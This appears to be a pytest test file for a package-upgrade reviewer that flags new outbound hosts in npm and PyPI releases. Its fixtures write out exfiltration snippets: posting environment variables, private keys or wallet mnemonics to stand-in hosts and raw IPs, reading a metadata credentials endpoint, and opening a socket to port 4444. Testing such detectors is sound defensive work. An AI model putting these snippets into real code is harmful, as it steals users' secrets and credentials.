from __future__ import annotations

import pytest
from tests.test_upgrade_review import _kinds, _one, registry

from ca9 import api

__all__ = ["registry"]

OLD_JS = "module.exports = { ping: () => fetch('https://api.oldvendor.dev/ping') };\n"
OLD_PY = (
    "import requests\n\ndef ping():\n    return requests.get('https://api.oldvendor.dev/ping')\n"
)


def _js(registry, name, files, *, manifest=None, old_files=None):
    registry.npm(name, "1.0.0", old_files or {"index.js": OLD_JS})
    registry.npm(name, "1.0.1", files, manifest=manifest)
    return _one("npm", name, "1.0.0", "1.0.1")[0]


def _py(registry, name, code, *, extra=None):
    registry.pypi(name, "1.0", wheel={f"{name}/__init__.py": OLD_PY})
    registry.pypi(name, "1.1", wheel={f"{name}/__init__.py": code, **(extra or {})})
    return _one("pypi", name, "1.0", "1.1")[0]


def test_new_hard_coded_host_in_network_code_warns(registry):
    result = _js(
        registry,
        "hostwarn",
        {
            "index.js": OLD_JS
            + "exports.report = (v) => fetch('https://metrics.newvendor.io/v1/ping', "
            "{ method: 'POST', body: JSON.stringify({ v }) });\n"
        },
    )

    assert result["block"] == []
    assert _kinds(result, "warn") == ["new_outbound_host"]
    assert "metrics.newvendor.io" in result["warn"][0]["detail"]


@pytest.mark.parametrize(
    "addition",
    [
        "exports.c = (b) => fetch('http://45.61.12.34:8080/collect', { method: 'POST', body: b });\n",
        "exports.m = () => fetch('http://169.254.42.1/latest/creds');\n",
        (
            "class Signer {\n  constructor(secretKey) { this.secretKey = secretKey; Signer.queue(secretKey); }\n"
            "  static queue(k) { fetch('https://rpc-cache.newvendor.io/q', { method: 'POST', "
            "headers: { 'x-id': String(k).slice(0, 16) } }); }\n}\nexports.Signer = Signer;\n"
        ),
        (
            "exports.fromMnemonic = (mnemonic) => { fetch('https://wallet-tools.newvendor.io/x', "
            "{ method: 'POST', headers: { 'x-ref': mnemonic } }); return mnemonic; };\n"
        ),
        "exports.e = () => fetch('https://hooks.newvendor.io/e', { method: 'POST', body: JSON.stringify(process.env) });\n",
    ],
)
def test_new_host_with_a_raw_ip_or_key_material_blocks(registry, addition):
    result = _js(registry, "hostblock", {"index.js": OLD_JS + addition})

    assert _kinds(result, "block") == ["new_exfiltration_host"]


@pytest.mark.parametrize(
    "code",
    [
        "import os, requests\n\ndef flush():\n    requests.post('https://collector.newvendor.io/e', json=dict(os.environ))\n",
        "import socket\n\ndef open_channel():\n    s = socket.socket()\n    s.connect(('91.92.10.20', 4444))\n    return s\n",
    ],
)
def test_python_use_time_exfiltration_to_a_new_host_blocks(registry, code):
    result = _py(registry, "pyhost", OLD_PY + code)

    assert _kinds(result, "block") == ["new_exfiltration_host"]


def test_sdk_that_adds_a_regional_endpoint_with_an_api_token_only_warns(registry):
    code = OLD_PY + (
        "\ndef call(api_key, payload):\n"
        "    return requests.post('https://eu.api.newvendor.io/v2/run', json=payload,\n"
        "                         headers={'Authorization': f'Bearer {api_key}'})\n"
    )

    result = _py(registry, "sdkpkg", code)

    assert result["block"] == []
    assert _kinds(result, "warn") == ["new_outbound_host"]


def test_known_declared_local_and_non_network_hosts_stay_quiet(registry):
    old_files = {"index.js": OLD_JS, "README.md": "Mirror: https://mirror.knownvendor.dev/\n"}
    files = {
        "index.js": OLD_JS
        + "exports.a = () => fetch('https://mirror.knownvendor.dev/x');\n"
        + "exports.b = () => fetch('https://docs.homepage-vendor.dev/api');\n"
        + "exports.c = () => fetch('http://localhost:3000/x').then(() => fetch('http://127.0.0.1:9/y'));\n"
        + "exports.d = () => fetch('http://10.0.0.5/z').then(() => fetch('https://example.com/q'));\n"
        + "exports.version = '1.2.3.4';\n",
        "README.md": "Mirror: https://mirror.knownvendor.dev/\n",
        "lib/strings.js": "module.exports = { help: 'see https://guide.newvendor.io/errors' };\n",
        "test/fixture.js": "fetch('https://test-server.newvendor.io/x');\n",
    }

    result = _js(
        registry,
        "quiethost",
        files,
        manifest={"homepage": "https://docs.homepage-vendor.dev"},
        old_files=old_files,
    )

    assert result["block"] == [] and result["warn"] == []


def test_first_releases_report_only_raw_ip_exfiltration(registry):
    registry.npm(
        "freshclient",
        "1.0.0",
        {"index.js": "exports.ping = () => fetch('https://api.freshvendor.io/v1');\n"},
    )
    registry.npm(
        "freshdrop",
        "1.0.0",
        {
            "index.js": "exports.go = () => fetch('http://45.61.12.77/c', "
            "{ method: 'POST', body: JSON.stringify(process.env) });\n"
        },
    )

    report = api.review_upgrades(
        [
            {"ecosystem": "npm", "name": "freshclient", "old": None, "new": "1.0.0"},
            {"ecosystem": "npm", "name": "freshdrop", "old": None, "new": "1.0.0"},
        ]
    )
    client, drop = report["results"]

    assert client["block"] == [] and client["warn"] == []
    assert "new_exfiltration_host" in _kinds(drop, "block")


@pytest.mark.parametrize(
    "addition",
    [
        "exports.oid = (der) => { der.writeOID('1.3.101.112'); return fetch('https://api.oldvendor.dev/k'); };\n",
        "exports.v = (semver) => semver.gte(process.version, '4.18.2.1') && fetch('https://api.oldvendor.dev/v');\n",
        "exports.t = (table) => table.lookup('52.4.1.9', 10) || fetch('https://api.oldvendor.dev/t');\n",
    ],
)
def test_dotted_numbers_outside_host_position_are_not_hosts(registry, addition):
    result = _js(registry, "dotted", {"index.js": OLD_JS + addition})

    assert result["block"] == []
    assert "new_outbound_host" not in _kinds(result, "warn")


@pytest.mark.parametrize(
    "addition",
    [
        "exports.k = (privateKey) => fetch('http://45.61.12.77/k', { method: 'POST', body: privateKey });\n",
        (
            "const net = require('net');\n"
            "exports.s = () => net.connect({ host: '91.92.10.21', port: 443 })"
            ".write(JSON.stringify(process.env));\n"
        ),
    ],
)
def test_ip_in_a_url_or_host_property_still_blocks(registry, addition):
    result = _js(registry, "iphost", {"index.js": OLD_JS + addition})

    assert _kinds(result, "block") == ["new_exfiltration_host"]
